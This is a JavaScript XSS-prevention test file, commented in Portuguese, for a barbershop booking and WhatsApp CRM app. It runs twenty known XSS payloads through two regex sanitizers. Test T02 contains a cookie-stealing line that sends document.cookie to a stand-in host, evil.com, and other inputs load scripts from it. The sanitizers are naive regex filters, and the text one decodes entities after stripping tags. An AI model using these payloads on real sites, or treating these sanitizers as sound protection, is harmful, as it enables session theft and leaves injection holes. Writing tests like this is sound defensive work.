/**
 * XSS Prevention Tests
 * Testa o sanitizador central contra payloads XSS conhecidos.
 *
 * Execução: node tests/security/xss.test.js
 * (Requer que lib/security/sanitizeHtml.js esteja acessível)
 */

// ──────────────────────────────────────────────────────
// Implementação inline do sanitizador para testes Node.js
// (evita dependência de módulos ES com import no Node)
// ──────────────────────────────────────────────────────

function sanitizeText(dirty, maxLength = 2000) {
  if (!dirty || typeof dirty !== 'string') return '';
  return dirty
    .replace(/<[^>]*>/g, '')
    .replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&amp;/g, '&')
    .replace(/&quot;/g, '"').replace(/&#x27;/g, "'")
    .replace(/[\u0000-\u001F\u007F]/g, '')
    .trim()
    .slice(0, maxLength);
}

function sanitizeHtml(dirty) {
  if (!dirty || typeof dirty !== 'string') return '';
  const ALLOWED_TAGS = new Set(['b','i','em','strong','u','s','br','p','ul','ol','li','blockquote','span']);
  let s = dirty.replace(/\bon\w+\s*=/gi, ' ');
  s = s.replace(/(href|src)\s*=\s*["']?(javascript|vbscript|data|blob)[^"'>\s]*/gi, '$1="#"');
  s = s.replace(/<\/?([a-zA-Z][a-zA-Z0-9]*)[^>]*>/g, (match, tag) => {
    return ALLOWED_TAGS.has(tag.toLowerCase()) ? match : '';
  });
  s = s.replace(/javascript\s*:/gi, 'blocked:');
  return s.trim();
}

// ──────────────────────────────────────────────────────
// TEST RUNNER
// ──────────────────────────────────────────────────────

let passed = 0, failed = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`  ✅ ${name}`);
    passed++;
  } catch (err) {
    console.error(`  ❌ ${name}: ${err.message}`);
    failed++;
  }
}

function assert(condition, message) {
  if (!condition) throw new Error(message || 'Assertion failed');
}

function assertNotContains(str, pattern, message) {
  const regex = typeof pattern === 'string' ? pattern : pattern.source;
  const contains = typeof pattern === 'string' ? str.includes(pattern) : pattern.test(str);
  if (contains) throw new Error(message || `String contém padrão proibido: ${regex} em: ${str}`);
}

// ──────────────────────────────────────────────────────
// PAYLOADS XSS CONHECIDOS
// ──────────────────────────────────────────────────────

const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  'javascript:alert(1)',
  '<iframe src="javascript:alert(1)">',
  '<body onload=alert(1)>',
  '"><script>alert(document.cookie)</script>',
  "<a href='javascript:void(alert(1))'>click</a>",
  '<div onclick=alert(1)>click</div>',
  '<input onfocus=alert(1) autofocus>',
  '<details open ontoggle=alert(1)>',
  '<<SCRIPT>alert("XSS");//<</SCRIPT>',
  '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
  '<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>',
  'data:text/html,<script>alert(1)</script>',
  '<svg><script>alert(1)</script></svg>',
  '<math><mtext></table></math><script>alert(1)</script>',
  '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
  '%3Cscript%3Ealert(1)%3C/script%3E',
  '<scr\0ipt>alert(1)</scr\0ipt>',
];

// ──────────────────────────────────────────────────────
// TESTES: sanitizeText (text-only)
// ──────────────────────────────────────────────────────

console.log('\n🛡 XSS Tests — sanitizeText (text-only fields)\n');

XSS_PAYLOADS.forEach((payload, i) => {
  test(`X${String(i + 1).padStart(2, '0')} — sanitizeText: ${payload.slice(0, 50)}`, () => {
    const result = sanitizeText(payload);
    assertNotContains(result, /<script/i, `sanitizeText não removeu <script>`);
    assertNotContains(result, /onerror/i, `sanitizeText não removeu onerror`);
    assertNotContains(result, /onload/i, `sanitizeText não removeu onload`);
    assertNotContains(result, /onclick/i, `sanitizeText não removeu onclick`);
    assertNotContains(result, /ontoggle/i, `sanitizeText não removeu ontoggle`);
    assertNotContains(result, /onfocus/i, `sanitizeText não removeu onfocus`);
    assertNotContains(result, /<iframe/i, `sanitizeText não removeu <iframe>`);
    assertNotContains(result, /<svg/i, `sanitizeText não removeu <svg>`);
  });
});

// ──────────────────────────────────────────────────────
// TESTES: sanitizeHtml (rich-text com allowlist)
// ──────────────────────────────────────────────────────

console.log('\n🛡 XSS Tests — sanitizeHtml (rich-text allowlist)\n');

test('H01 — bloqueia <script> tag', () => {
  const r = sanitizeHtml('<script>alert(1)</script>');
  assertNotContains(r, /<script/i, 'script deve ser removido');
});

test('H02 — bloqueia event handlers inline', () => {
  const r = sanitizeHtml('<div onclick="alert(1)">text</div>');
  assertNotContains(r, /onclick/i, 'onclick deve ser removido');
});

test('H03 — bloqueia javascript: href', () => {
  const r = sanitizeHtml('<a href="javascript:alert(1)">click</a>');
  assertNotContains(r, /javascript:/i, 'javascript: deve ser bloqueado');
});

test('H04 — mantém tags permitidas (<b>, <em>, <strong>)', () => {
  const r = sanitizeHtml('<b>texto em negrito</b> e <em>itálico</em>');
  assert(r.includes('<b>'), 'deve manter <b>');
  assert(r.includes('<em>'), 'deve manter <em>');
});

test('H05 — remove <iframe>', () => {
  const r = sanitizeHtml('<iframe src="http://evil.com"></iframe>');
  assertNotContains(r, /<iframe/i, 'iframe deve ser removido');
});

test('H06 — bloqueia SVG com onload', () => {
  const r = sanitizeHtml('<svg onload=alert(1)>');
  assertNotContains(r, /onload/i, 'onload em SVG deve ser removido');
});

test('H07 — bloqueia data: URI malicioso', () => {
  const r = sanitizeHtml('<img src="data:text/html,<script>alert(1)</script>">');
  assertNotContains(r, /data:text\/html/i, 'data:text/html deve ser bloqueado');
});

test('H08 — bloqueia onerror em img', () => {
  const r = sanitizeHtml('<img src=x onerror=alert(1)>');
  assertNotContains(r, /onerror/i, 'onerror deve ser removido');
});

test('H09 — texto simples preservado sem alteração', () => {
  const input = 'Olá, João! Seu corte ficou ótimo.';
  const r = sanitizeHtml(input);
  assert(r === input, `texto simples não deve ser alterado: ${r}`);
});

test('H10 — emoji preservado', () => {
  const input = '✅ Agendamento confirmado 🎉';
  const r = sanitizeHtml(input);
  assert(r.includes('✅') && r.includes('🎉'), 'emojis devem ser preservados');
});

// ──────────────────────────────────────────────────────
// TESTES: campos de templates WhatsApp
// ──────────────────────────────────────────────────────

console.log('\n🛡 XSS Tests — templates WhatsApp/CRM\n');

test('T01 — template com variáveis {nome} preservado', () => {
  const input = 'Olá {nome}! Seu horário na {barbearia} é às {hora}.';
  const r = sanitizeText(input);
  assert(r.includes('{nome}'), 'variáveis de template devem ser preservadas');
  assert(r.includes('{barbearia}'), 'variáveis de template devem ser preservadas');
});

test('T02 — template com XSS removido', () => {
  const input = 'Olá {nome}! <script>fetch("evil.com/steal?c="+document.cookie)</script>';
  const r = sanitizeText(input);
  assertNotContains(r, /<script/i, 'script em template deve ser removido');
  assert(r.includes('{nome}'), 'variável deve ser preservada');
});

test('T03 — notas do cliente com injection bloqueada', () => {
  const input = 'Cliente prefere corte curto. <img onerror="alert(1)" src=x>';
  const r = sanitizeText(input);
  assertNotContains(r, /onerror/i, 'onerror em nota deve ser bloqueado');
});

// ──────────────────────────────────────────────────────
// RESULTADO
// ──────────────────────────────────────────────────────

console.log(`\n${'─'.repeat(50)}`);
console.log(`Resultado XSS: ${passed} passou / ${failed} falhou / ${passed + failed} total`);
if (failed === 0) {
  console.log('✅ TODOS OS TESTES XSS PASSARAM\n');
} else {
  console.error(`❌ ${failed} TESTE(S) FALHARAM\n`);
  if (typeof globalThis.process !== 'undefined') globalThis.process.exit(1);
}